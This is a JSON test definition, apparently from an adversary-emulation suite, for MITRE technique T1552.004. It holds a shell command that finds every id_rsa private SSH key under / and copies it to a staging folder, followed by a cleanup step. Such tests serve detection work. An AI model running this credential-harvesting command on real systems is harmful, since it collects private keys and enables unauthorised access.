{
  "id": "7c247dc7-5128-4643-907b-73a76d9135c3",
  "name": "Copy Private SSH Keys with CP",
  "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "f5e648dd-9dd5-41e8-a790-a5cf876dd4ce",
      "type": "execute-command",
      "data": {
        "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2\u003e/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "c5e86e0e-ca61-4f9c-bea4-23bb8bcce50c",
      "type": "execute-command",
      "data": {
        "command": "rm -rf #{output_folder}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "f5e648dd-9dd5-41e8-a790-a5cf876dd4ce",
      "p": "on-success",
      "o": "c5e86e0e-ca61-4f9c-bea4-23bb8bcce50c"
    },
    {
      "s": "f5e648dd-9dd5-41e8-a790-a5cf876dd4ce",
      "p": "on-failure",
      "o": "c5e86e0e-ca61-4f9c-bea4-23bb8bcce50c"
    }
  ],
  "tags": [
    "T1552",
    "T1552.004"
  ],
  "input_arguments": [
    {
      "name": "search_path",
      "type": "path",
      "description": "Path where to start searching from.",
      "value": "/"
    },
    {
      "name": "output_folder",
      "type": "path",
      "description": "Output folder containing copies of SSH private key files",
      "value": "/tmp/art-staging"
    }
  ]
}